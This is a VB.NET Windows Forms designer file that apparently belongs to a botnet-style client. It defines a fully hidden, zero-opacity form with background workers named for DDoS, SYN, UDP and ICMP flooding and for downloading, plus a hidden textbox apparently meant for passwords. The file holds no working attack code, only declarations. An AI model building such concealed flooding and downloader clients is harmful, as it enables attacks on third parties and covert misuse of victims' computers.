﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Me.tmr1 = New System.Windows.Forms.Timer(Me.components)
        Me.freshme = New System.Windows.Forms.Timer(Me.components)
        Me.bwDDOS = New System.ComponentModel.BackgroundWorker
        Me.bwdownloader = New System.ComponentModel.BackgroundWorker
        Me.bwSyn = New System.ComponentModel.BackgroundWorker
        Me.bwUdp = New System.ComponentModel.BackgroundWorker
        Me.bwIcmp = New System.ComponentModel.BackgroundWorker
        Me.txtpws = New System.Windows.Forms.TextBox
        Me.SuspendLayout()
        '
        'tmr1
        '
        Me.tmr1.Interval = 45000
        '
        'freshme
        '
        Me.freshme.Interval = 40
        '
        'bwDDOS
        '
        '
        'bwdownloader
        '
        '
        'bwSyn
        '
        '
        'bwUdp
        '
        '
        'bwIcmp
        '
        '
        'txtpws
        '
        Me.txtpws.Location = New System.Drawing.Point(12, 12)
        Me.txtpws.Multiline = True
        Me.txtpws.Name = "txtpws"
        Me.txtpws.Size = New System.Drawing.Size(13, 20)
        Me.txtpws.TabIndex = 2
        Me.txtpws.Visible = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(24, 28)
        Me.ControlBox = False
        Me.Controls.Add(Me.txtpws)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.Opacity = 0
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents tmr1 As System.Windows.Forms.Timer
    Friend WithEvents freshme As System.Windows.Forms.Timer
    Friend WithEvents bwDDOS As System.ComponentModel.BackgroundWorker
    Friend WithEvents bwdownloader As System.ComponentModel.BackgroundWorker
    Friend WithEvents bwSyn As System.ComponentModel.BackgroundWorker
    Friend WithEvents bwUdp As System.ComponentModel.BackgroundWorker
    Friend WithEvents bwIcmp As System.ComponentModel.BackgroundWorker
    Friend WithEvents txtpws As System.Windows.Forms.TextBox

End Class
